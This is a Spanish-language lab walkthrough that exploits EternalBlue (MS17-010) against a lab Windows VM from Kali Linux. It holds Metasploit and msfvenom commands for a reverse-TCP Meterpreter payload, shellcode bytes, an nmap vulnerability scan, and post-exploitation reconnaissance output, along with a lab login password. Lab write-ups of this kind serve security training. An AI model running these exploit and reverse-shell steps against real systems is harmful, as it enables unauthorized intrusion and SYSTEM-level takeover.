---
title: "Lab.03 - Kill Chain 3"
date: 2026-06-20
categories: [lab, setup]
tags: [kill Chain3, EternalBlue, metasploitable, kali]
---

# **KILL CHAIN 3: EternalBlue / MS17-010**

## **Lab: Detección y Explotación**

# Paso 0: Inspeccionar el módulo antes de explotar
Antes de lanzar el exploit, es importante conocer la herramienta con la que se trabajará. Para ello, se abre la terminal de **Kali Linux** y se ejecutan los comandos mostrados a continuación, los cuales permiten visualizar la información del módulo, sus características y las opciones de configuración antes de proceder con su ejecución.

    msfconsole -q
    use exploit/windows/smb/ms17_010_eternalblue
    info

![F1.1](/assets/KILL3/F1.1.png)

El comando **info** permite consultar la información del módulo antes de ejecutarlo. Entre los datos que muestra se encuentran los CVE, que son códigos que identifican oficialmente las vulnerabilidades que el exploit puede aprovechar, además de las plataformas compatibles, las opciones de configuración y una descripción técnica del problema de seguridad.

        Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
        Module: exploit/windows/smb/ms17_010_eternalblue
    Platform: Windows
        Arch: x64
    Privileged: Yes
        License: Metasploit Framework License (BSD)
        Rank: Average
    Disclosed: 2017-03-14

    Provided by:
    Equation Group
    Shadow Brokers
    sleepya
    Sean Dillon <sean.dillon@risksense.com>
    Dylan Davis <dylan.davis@risksense.com>
    thelightcosine
    wvu <wvu@metasploit.com>
    agalway-r7
    cdelafuente-r7
    cdelafuente-r7
    agalway-r7

    Available targets:
        Id  Name
        --  ----
    =>  0   Automatic Target
        1   Windows 7
        2   Windows Embedded Standard 7
        3   Windows Server 2008 R2
        4   Windows 8
        5   Windows 8.1
        6   Windows Server 2012
        7   Windows 10 Pro
        8   Windows 10 Enterprise Evaluation

    Check supported:
    Yes

    Basic options:
    Name           Current Setting  Required  Description
    ----           ---------------  --------  -----------
    RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/d
                                                ocs/using-metasploit/basics/using-metasploit.html
    RPORT          445              yes       The target port (TCP)
    SMBDomain                       no        (Optional) The Windows domain to use for authenticati
                                                on. Only affects Windows Server 2008 R2, Windows 7, W
                                                indows Embedded Standard 7 target machines.
    SMBPass                         no        (Optional) The password for the specified username
    SMBUser                         no        (Optional) The username to authenticate as
    VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
                                                Only affects Windows Server 2008 R2, Windows 7, Windo
                                                ws Embedded Standard 7 target machines.
    VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affec
                                                ts Windows Server 2008 R2, Windows 7, Windows Embedde
                                                d Standard 7 target machines.

    Payload information:
    Space: 2000

    Description:
    This module is a port of the Equation Group ETERNALBLUE exploit, part of
    the FuzzBunch toolkit released by Shadow Brokers.

    There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size
    is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a
    DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow
    is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later
    completed in srvnet!SrvNetWskReceiveComplete.

    This exploit, like the original may not trigger 100% of the time, and should be
    run continuously until triggered. It seems like the pool will get hot streaks
    and need a cool down period before the shells rain in again.

    The module will attempt to use Anonymous login, by default, to authenticate to perform the
    exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it wiluse
    those instead.

    On some systems, this module may cause system instability and crashes, such as a BSOD or
    a reboot. This may be more likely with some payloads.

    References:
    https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
    https://nvd.nist.gov/vuln/detail/CVE-2017-0143
    https://nvd.nist.gov/vuln/detail/CVE-2017-0144
    https://nvd.nist.gov/vuln/detail/CVE-2017-0145
    https://nvd.nist.gov/vuln/detail/CVE-2017-0146
    https://nvd.nist.gov/vuln/detail/CVE-2017-0147
    https://nvd.nist.gov/vuln/detail/CVE-2017-0148
    https://github.com/RiskSense-Ops/MS17-010
    https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf
    https://www.exploit-db.com/exploits/42030

    Also known as:
    ETERNALBLUE

    View the full module info with the info -d command.

Para ver dónde vive el archivo Ruby en Kali:

    INPUT: locate ms17_010_eternalblue.rb  
    OUTPUT: /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb

Vista de la terminal:
![F1.2](/assets/KILL3/F1.2.png)

Para visualizar cómo Metasploit construye el payload utilizando los parámetros previamente configurados, se ingresa el siguiente comando en la terminal.
    
    INPUT en Kali:
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.9 LPORT=4444 -f hex 2>/dev/null | head -c 160
    
    OUTPUT: primeros bytes del shellcode generado
    fc4883e4f0e8cc0000004151415052514831d25665488b5260488b5218488b52204d31c9480fb74a4a488b72504831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178    

Vista del **LHOST** de la guía de laboratorio **(10.0.2.9)** y LHOST del usuario real **(10.0.2.3)**, respectimante:

![F1.3](/assets/KILL3/F1.3.png)
![F1.4](/assets/KILL3/F1.4.png)

**NOTA:** El valor LHOST=10.0.2.9 **(Según la IP de nuestra MV: LHOST=10.0.2.3)** y **LPORT=4444** se incorporan al payload durante su generación. Esto permite que, cuando el exploit se ejecute en la máquina víctima, el payload establezca una conexión de regreso hacia la máquina atacante a través del puerto 4444. Si se modifica el valor de LHOST, Metasploit debe generar un nuevo payload, ya que la dirección IP forma parte del código que se ejecutará en la víctima.

# Paso 1: Confirmar la vulnerabilidad

Se comprueba si la máquina víctima presenta vulnerabilidades antes de realizar la explotación.
Para la verificación tener en cuenta la contraseña para el ingreso que solicita **"sudo"**, ya que está pidiendo la contraseña del usuario de Kali Linux con el que se inició sesión. 

Siendo en Kali:

    USUARIO: user
    CONTRASEÑA: user123

    Comando utilizado:
    sudo nmap --script vuln -p 445 10.0.2.15

Output esperado:
![F1.5](/assets/KILL3/F1.5.png)

# Paso 2: Explotar con Metasploit

Comando ingresado para la explotación:

    msfconsole -q
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 10.0.2.15
    set LHOST 10.0.2.3   (IP del lab guía: 10.0.2.9)
    set payload windows/x64/meterpreter/reverse_tcp
    run

Output esperado:
![F1.6](/assets/KILL3/F1.6.png)

# Paso 3: Post-Explotación con Meterpreter
Tras obtener una sesión con privilegios de **NT AUTHORITY\SYSTEM, pueden ejecutarse diversos comandos para interactuar con el sistema. Los siguientes se organizan de acuerdo con su objetivo:

    meterpreter > sysinfo  # OS, hostname, arquitectura, dominio
    meterpreter > getuid   # confirmar NT AUTHORITY\SYSTEM
    meterpreter > getpid   # PID del proceso donde está inyectado el payload

Verificación del acceso obtenido:

![F1.7](/assets/KILL3/F1.7.png)

Listado de todo los procesos en ejecución:

    meterpreter > ps

    Process List                                                                                        
    ============                                                                                        
                                                                                                        
    PID   PPID  Name             Arch  Session  User                       Path                        
    ---   ----  ----             ----  -------  ----                       ----                        
    0     0     [System Process                                                                        
                ]                                                                                      
    4     0     System           x64   0                                                               
    280   4     smss.exe         x64   0        NT AUTHORITY\SYSTEM        \SystemRoot\System32\smss.  
                                                                            exe                         
    316   352   conhost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\system32\conhos
                                                E                          t.exe
    332   884   taskeng.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\tasken
                                                                            g.exe
    352   344   csrss.exe        x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\csrss.
                                                                            exe
    408   344   wininit.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\winini
                                                                            t.exe
    416   396   csrss.exe        x64   1        NT AUTHORITY\SYSTEM        C:\Windows\system32\csrss.
                                                                            exe
    444   396   winlogon.exe     x64   1        NT AUTHORITY\SYSTEM        C:\Windows\system32\winlog
                                                                            on.exe
    504   408   services.exe     x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\servic
                                                                            es.exe
    512   408   lsass.exe        x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\lsass.
                                                                            exe
    520   408   lsm.exe          x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\lsm.ex
                                                                            e
    628   504   svchost.exe      x64   0        NT AUTHORITY\SYSTEM
    688   504   VBoxService.exe  x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\VBoxSe
                                                                            rvice.exe
    744   504   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV
                                                ICE
    824   504   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC
                                                E
    884   504   svchost.exe      x64   0        NT AUTHORITY\SYSTEM
    904   504   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC
                                                E
    928   504   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC
                                                E
    972   504   svchost.exe      x64   0        NT AUTHORITY\SYSTEM
    1012  504   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV
                                                ICE
    1076  1548  java.exe         x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Program Files\Java\jdk1
                                                E                          .8.0_144\bin\java.exe
    1152  504   spoolsv.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\System32\spools
                                                                            v.exe
    1188  504   wrapper.exe      x86   0        NT AUTHORITY\LOCAL SERVIC
                                                E
    1248  332   cmd.exe          x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\cmd.ex
                                                                            e
    1264  352   conhost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\conhos
                                                                            t.exe
    1316  352   conhost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\system32\conhos
                                                E                          t.exe
    1324  504   domain1Service.  x64   0        NT AUTHORITY\LOCAL SERVIC
                exe                             E
    1412  504   elasticsearch-s  x64   0        NT AUTHORITY\SYSTEM        C:\Program Files\elasticse
                ervice-x64.exe                                             arch-1.1.1\bin\elasticsear
                                                                            ch-service-x64.exe
    1424  352   conhost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\conhos
                                                                            t.exe
    1432  1188  java.exe         x86   0        NT AUTHORITY\LOCAL SERVIC  C:\ManageEngine\DesktopCen
                                                E                          tral_Server\jre\bin\java.e
                                                                            xe
    1468  504   jenkins.exe      x64   0        NT AUTHORITY\LOCAL SERVIC
                                                E
    1500  1324  cmd.exe          x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\system32\cmd.ex
                                                E                          e
    1512  352   conhost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\system32\conhos
                                                E                          t.exe
    1548  1500  java.exe         x64   0        NT AUTHORITY\LOCAL SERVIC  C:\ProgramData\Oracle\Java
                                                E                          \javapath\java.exe
    1660  352   conhost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\system32\conhos
                                                E                          t.exe
    1676  1248  ruby.exe         x64   0        NT AUTHORITY\SYSTEM        C:\tools\ruby23\bin\ruby.e
                                                                            xe
    1772  504   jmx.exe          x64   0        NT AUTHORITY\LOCAL SERVIC
                                                E
    1808  352   conhost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\system32\conhos
                                                E                          t.exe
    1904  504   dcnotifications  x86   0        NT AUTHORITY\LOCAL SERVIC
                erver.exe                       E
    1992  504   dcserverhttpd.e  x86   0        NT AUTHORITY\LOCAL SERVIC
                xe                              E
    2160  1992  dcrotatelogs.ex  x86   0        NT AUTHORITY\LOCAL SERVIC  C:\ManageEngine\DesktopCen
                e                               E                          tral_Server\apache\bin\dcr
                                                                            otatelogs.exe
    2172  352   conhost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\system32\conhos
                                                E                          t.exe
    2200  1992  dcserverhttpd.e  x86   0        NT AUTHORITY\LOCAL SERVIC  C:\ManageEngine\DesktopCen
                xe                              E                          tral_Server\apache\bin\dcs
                                                                            erverhttpd.exe
    2232  1772  cmd.exe          x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\system32\cmd.ex
                                                E                          e
    2284  1676  ruby.exe         x64   0        NT AUTHORITY\SYSTEM        C:\tools\ruby23\bin\ruby.e
                                                                            xe
    2292  2232  java.exe         x64   0        NT AUTHORITY\LOCAL SERVIC  C:\openjdk6\openjdk-1.6.0-
                                                E                          unofficial-b27-windows-amd
                                                                            64\jre\bin\java.exe
    2312  352   conhost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\system32\conhos
                                                E                          t.exe
    2320  3604  httpd.exe        x64   0        NT AUTHORITY\LOCAL SERVIC  C:\wamp\bin\apache\apache2
                                                E                          .2.21\bin\httpd.exe
    2352  2200  dcrotatelogs.ex  x86   0        NT AUTHORITY\LOCAL SERVIC  C:\ManageEngine\DesktopCen
                e                               E                          tral_Server\apache\bin\dcr
                                                                            otatelogs.exe
    2372  352   conhost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\system32\conhos
                                                E                          t.exe
    2396  2252  cmd.exe          x86   0        NT AUTHORITY\LOCAL SERVIC  C:\Windows\SysWOW64\CMD.ex
                                                E                          e
    2432  2396  postgres.exe     x86   0        NT AUTHORITY\LOCAL SERVIC  C:\ManageEngine\DesktopCen
                                                E                          tral_Server\pgsql\bin\post
                                                                            gres.exe
    3120  504   cygrunsrv.exe    x64   0        VAGRANT-2008R2\sshd_serve  C:\Program Files\OpenSSH\b
                                                r                          in\cygrunsrv.exe
    3128  2432  postgres.exe     x86   0        NT AUTHORITY\LOCAL SERVIC  C:\ManageEngine\DesktopCen
                                                E                          tral_Server\pgsql\bin\post
                                                                            gres.exe
    3208  504   taskhost.exe     x64   1        VAGRANT-2008R2\Administra  C:\Windows\system32\taskho
                                                tor                        st.exe
    3356  504   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC
                                                E
    3368  504   svchost.exe      x64   0        NT AUTHORITY\LOCAL SERVIC
                                                E
    3388  1468  java.exe         x64   0        NT AUTHORITY\LOCAL SERVIC  C:\ProgramData\Oracle\Java
                                                E                          \javapath\java.exe
    3464  972   dwm.exe          x64   1        VAGRANT-2008R2\Administra  C:\Windows\system32\Dwm.ex
                                                tor                        e
    3488  504   tomcat8.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Program Files\Apache So
                                                                            ftware Foundation\tomcat\a
                                                                            pache-tomcat-8.0.33\bin\to
                                                                            mcat8.exe
    3504  352   conhost.exe      x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\conhos
                                                                            t.exe
    3544  3428  explorer.exe     x64   1        VAGRANT-2008R2\Administra  C:\Windows\Explorer.EXE
                                                tor
    3604  504   httpd.exe        x64   0        NT AUTHORITY\LOCAL SERVIC
                                                E
    3780  352   conhost.exe      x64   0        VAGRANT-2008R2\sshd_serve  C:\Windows\system32\conhos
                                                r                          t.exe
    3820  3752  sshd.exe         x64   0        VAGRANT-2008R2\sshd_serve  C:\Program Files\OpenSSH\u
                                                r                          sr\sbin\sshd.exe
    3828  504   mysqld.exe       x64   0        NT AUTHORITY\SYSTEM        c:\wamp\bin\mysql\mysql5.5
                                                                            .20\bin\mysqld.exe
    3988  504   wlms.exe         x64   0        NT AUTHORITY\SYSTEM        C:\Windows\system32\wlms\w
                                                                            lms.exe
    4136  2432  postgres.exe     x86   0        NT AUTHORITY\LOCAL SERVIC  C:\ManageEngine\DesktopCen
                                                E                          tral_Server\pgsql\bin\post
                                                                            gres.exe
    4144  2432  postgres.exe     x86   0        NT AUTHORITY\LOCAL SERVIC  C:\ManageEngine\DesktopCen
                                                E                          tral_Server\pgsql\bin\post
                                                                            gres.exe
    4152  2432  postgres.exe     x86   0        NT AUTHORITY\LOCAL SERVIC  C:\ManageEngine\DesktopCen
                                                E                          tral_Server\pgsql\bin\post
                                                                            gres.exe
    4160  2432  postgres.exe     x86   0        NT AUTHORITY\LOCAL SERVIC  C:\ManageEngine\DesktopCen
                                                E                          tral_Server\pgsql\bin\post
                                                                            gres.exe
    4168  2432  postgres.exe     x86   0        NT AUTHORITY\LOCAL SERVIC  C:\ManageEngine\DesktopCen
                                                E                          tral_Server\pgsql\bin\post
                                                                            gres.exe
    4176  2432  postgres.exe     x86   0        NT AUTHORITY\LOCAL SERVIC  C:\ManageEngine\DesktopCen
                                                E                          tral_Server\pgsql\bin\post
                                                                            gres.exe
    4336  628   slui.exe
    4388  504   sppsvc.exe       x64   0        NT AUTHORITY\NETWORK SERV
                                                ICE
    4448  3544  VBoxTray.exe     x64   1        VAGRANT-2008R2\Administra  C:\Windows\System32\VBoxTr
                                                tor                        ay.exe
    4460  2432  postgres.exe     x86   0        NT AUTHORITY\LOCAL SERVIC  C:\ManageEngine\DesktopCen
                                                E                          tral_Server\pgsql\bin\post
                                                                            gres.exe
    4472  3544  DesktopCentral.  x86   1        VAGRANT-2008R2\Administra  C:\ManageEngine\DesktopCen
                exe                             tor                        tral_Server\bin\DesktopCen
                                                                            tral.exe
    4560  504   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV
                                                ICE
    4712  504   svchost.exe      x64   0        NT AUTHORITY\NETWORK SERV
                                                ICE
    5776  504   msdtc.exe        x64   0        NT AUTHORITY\NETWORK SERV
                                                ICE

**Exploración de la red desde dentro del target.**

***Interfaces de red — buscar otras subredes internas.***

    meterpreter > ipconfig   

![F1.8](/assets/KILL3/F1.8.png)

***Tabla ARP — otros hosts activos en la red.***

    meterpreter > arp              

![F1.9](/assets/KILL3/F1.9.png)

***Conexiones activas y puertos en escucha.***

    meterpreter > netstat  

    meterpreter > netstat

    Connection list
    ===============

        Proto  Local address    Remote address   State        User  Inode  PID/Program name
        -----  -------------    --------------   -----        ----  -----  ----------------
        tcp    0.0.0.0:22       0.0.0.0:*        LISTEN       0     0      3820/sshd.exe
        tcp    0.0.0.0:135      0.0.0.0:*        LISTEN       0     0      744/svchost.exe
        tcp    0.0.0.0:445      0.0.0.0:*        LISTEN       0     0      4/System
        tcp    0.0.0.0:1617     0.0.0.0:*        LISTEN       0     0      2292/java.exe
        tcp    0.0.0.0:3000     0.0.0.0:*        LISTEN       0     0      2284/ruby.exe
        tcp    0.0.0.0:3306     0.0.0.0:*        LISTEN       0     0      3828/mysqld.exe
        tcp    0.0.0.0:3389     0.0.0.0:*        LISTEN       0     0      4712/svchost.exe
        tcp    0.0.0.0:3700     0.0.0.0:*        LISTEN       0     0      1076/java.exe
        tcp    0.0.0.0:4848     0.0.0.0:*        LISTEN       0     0      1076/java.exe
        tcp    0.0.0.0:5985     0.0.0.0:*        LISTEN       0     0      4/System
        tcp    0.0.0.0:7676     0.0.0.0:*        LISTEN       0     0      1076/java.exe
        tcp    0.0.0.0:8009     0.0.0.0:*        LISTEN       0     0      3488/tomcat8.exe
        tcp    0.0.0.0:8019     0.0.0.0:*        LISTEN       0     0      1432/java.exe
        tcp    0.0.0.0:8020     0.0.0.0:*        LISTEN       0     0      1992/dcserverhttpd.exe
        tcp    0.0.0.0:8022     0.0.0.0:*        LISTEN       0     0      1432/java.exe
        tcp    0.0.0.0:8027     0.0.0.0:*        LISTEN       0     0      1904/dcnotificationserver.e
        tcp    0.0.0.0:8028     0.0.0.0:*        LISTEN       0     0      2432/postgres.exe
        tcp    0.0.0.0:8031     0.0.0.0:*        LISTEN       0     0      1432/java.exe
        tcp    0.0.0.0:8032     0.0.0.0:*        LISTEN       0     0      1432/java.exe
        tcp    0.0.0.0:8080     0.0.0.0:*        LISTEN       0     0      1076/java.exe
        tcp    0.0.0.0:8181     0.0.0.0:*        LISTEN       0     0      1076/java.exe
        tcp    0.0.0.0:8282     0.0.0.0:*        LISTEN       0     0      3488/tomcat8.exe
        tcp    0.0.0.0:8383     0.0.0.0:*        LISTEN       0     0      1992/dcserverhttpd.exe
        tcp    0.0.0.0:8443     0.0.0.0:*        LISTEN       0     0      1432/java.exe
        tcp    0.0.0.0:8444     0.0.0.0:*        LISTEN       0     0      1432/java.exe
        tcp    0.0.0.0:8484     0.0.0.0:*        LISTEN       0     0      3388/java.exe
        tcp    0.0.0.0:8585     0.0.0.0:*        LISTEN       0     0      3604/httpd.exe
        tcp    0.0.0.0:8686     0.0.0.0:*        LISTEN       0     0      1076/java.exe
        tcp    0.0.0.0:9200     0.0.0.0:*        LISTEN       0     0      1412/elasticsearch-service-
        tcp    0.0.0.0:9300     0.0.0.0:*        LISTEN       0     0      1412/elasticsearch-service-
        tcp    0.0.0.0:47001    0.0.0.0:*        LISTEN       0     0      4/System
        tcp    0.0.0.0:49152    0.0.0.0:*        LISTEN       0     0      408/wininit.exe
        tcp    0.0.0.0:49153    0.0.0.0:*        LISTEN       0     0      824/svchost.exe
        tcp    0.0.0.0:49154    0.0.0.0:*        LISTEN       0     0      884/svchost.exe
        tcp    0.0.0.0:49155    0.0.0.0:*        LISTEN       0     0      512/lsass.exe
        tcp    0.0.0.0:49170    0.0.0.0:*        LISTEN       0     0      1432/java.exe
        tcp    0.0.0.0:49192    0.0.0.0:*        LISTEN       0     0      2292/java.exe
        tcp    0.0.0.0:49193    0.0.0.0:*        LISTEN       0     0      2292/java.exe
        tcp    0.0.0.0:49219    0.0.0.0:*        LISTEN       0     0      3388/java.exe
        tcp    0.0.0.0:49220    0.0.0.0:*        LISTEN       0     0      3388/java.exe
        tcp    0.0.0.0:49260    0.0.0.0:*        LISTEN       0     0      504/services.exe
        tcp    0.0.0.0:49266    0.0.0.0:*        LISTEN       0     0      4560/svchost.exe
        tcp    10.0.2.15:139    0.0.0.0:*        LISTEN       0     0      4/System
        tcp    10.0.2.15:9300   10.0.2.15:49171  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:9300   10.0.2.15:49172  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:9300   10.0.2.15:49173  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:9300   10.0.2.15:49174  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:9300   10.0.2.15:49175  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:9300   10.0.2.15:49176  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:9300   10.0.2.15:49177  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:9300   10.0.2.15:49178  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:9300   10.0.2.15:49179  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:9300   10.0.2.15:49180  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:9300   10.0.2.15:49181  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:9300   10.0.2.15:49182  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:9300   10.0.2.15:49183  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:49171  10.0.2.15:9300   ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:49172  10.0.2.15:9300   ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:49173  10.0.2.15:9300   ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:49174  10.0.2.15:9300   ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:49175  10.0.2.15:9300   ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:49176  10.0.2.15:9300   ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:49177  10.0.2.15:9300   ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:49178  10.0.2.15:9300   ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:49179  10.0.2.15:9300   ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:49180  10.0.2.15:9300   ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:49181  10.0.2.15:9300   ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:49182  10.0.2.15:9300   ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:49183  10.0.2.15:9300   ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    10.0.2.15:51003  10.0.2.3:4444    ESTABLISHED  0     0      1152/spoolsv.exe
        tcp    127.0.0.1:8005   0.0.0.0:*        LISTEN       0     0      3488/tomcat8.exe
        tcp    127.0.0.1:8028   127.0.0.1:49265  ESTABLISHED  0     0      2432/postgres.exe
        tcp    127.0.0.1:31000  127.0.0.1:32000  ESTABLISHED  0     0      1432/java.exe
        tcp    127.0.0.1:32000  0.0.0.0:*        LISTEN       0     0      1188/wrapper.exe
        tcp    127.0.0.1:32000  127.0.0.1:31000  ESTABLISHED  0     0      1188/wrapper.exe
        tcp    127.0.0.1:49157  127.0.0.1:49158  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49158  127.0.0.1:49157  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49159  127.0.0.1:49160  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49160  127.0.0.1:49159  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49161  127.0.0.1:49162  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49162  127.0.0.1:49161  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49164  127.0.0.1:49165  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49165  127.0.0.1:49164  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49166  127.0.0.1:49167  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49167  127.0.0.1:49166  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49168  127.0.0.1:49169  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49169  127.0.0.1:49168  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49184  127.0.0.1:49185  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49185  127.0.0.1:49184  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49186  127.0.0.1:49187  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49187  127.0.0.1:49186  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49188  127.0.0.1:49189  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49189  127.0.0.1:49188  ESTABLISHED  0     0      1412/elasticsearch-service-
        tcp    127.0.0.1:49197  127.0.0.1:49198  ESTABLISHED  0     0      3388/java.exe
        tcp    127.0.0.1:49198  127.0.0.1:49197  ESTABLISHED  0     0      3388/java.exe
        tcp    127.0.0.1:49202  127.0.0.1:49203  ESTABLISHED  0     0      1076/java.exe
        tcp    127.0.0.1:49203  127.0.0.1:49202  ESTABLISHED  0     0      1076/java.exe
        tcp    127.0.0.1:49205  127.0.0.1:49206  ESTABLISHED  0     0      1076/java.exe
        tcp    127.0.0.1:49206  127.0.0.1:49205  ESTABLISHED  0     0      1076/java.exe
        tcp    127.0.0.1:49207  127.0.0.1:49208  ESTABLISHED  0     0      1076/java.exe
        tcp    127.0.0.1:49208  127.0.0.1:49207  ESTABLISHED  0     0      1076/java.exe
        tcp    127.0.0.1:49209  127.0.0.1:49210  ESTABLISHED  0     0      1076/java.exe
        tcp    127.0.0.1:49210  127.0.0.1:49209  ESTABLISHED  0     0      1076/java.exe
        tcp    127.0.0.1:49213  127.0.0.1:49214  ESTABLISHED  0     0      3388/java.exe
        tcp    127.0.0.1:49214  127.0.0.1:49213  ESTABLISHED  0     0      3388/java.exe
        tcp    127.0.0.1:49215  127.0.0.1:49216  ESTABLISHED  0     0      3388/java.exe
        tcp    127.0.0.1:49216  127.0.0.1:49215  ESTABLISHED  0     0      3388/java.exe
        tcp    127.0.0.1:49217  127.0.0.1:49218  ESTABLISHED  0     0      3388/java.exe
        tcp    127.0.0.1:49218  127.0.0.1:49217  ESTABLISHED  0     0      3388/java.exe
        tcp    127.0.0.1:49221  127.0.0.1:49222  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49222  127.0.0.1:49221  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49223  127.0.0.1:49224  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49224  127.0.0.1:49223  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49225  127.0.0.1:49226  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49226  127.0.0.1:49225  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49227  127.0.0.1:49228  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49228  127.0.0.1:49227  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49229  127.0.0.1:49230  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49230  127.0.0.1:49229  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49231  127.0.0.1:49232  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49232  127.0.0.1:49231  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49233  127.0.0.1:49234  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49234  127.0.0.1:49233  ESTABLISHED  0     0      3488/tomcat8.exe
        tcp    127.0.0.1:49235  127.0.0.1:49236  ESTABLISHED  0     0      3488/tomcat8.exe
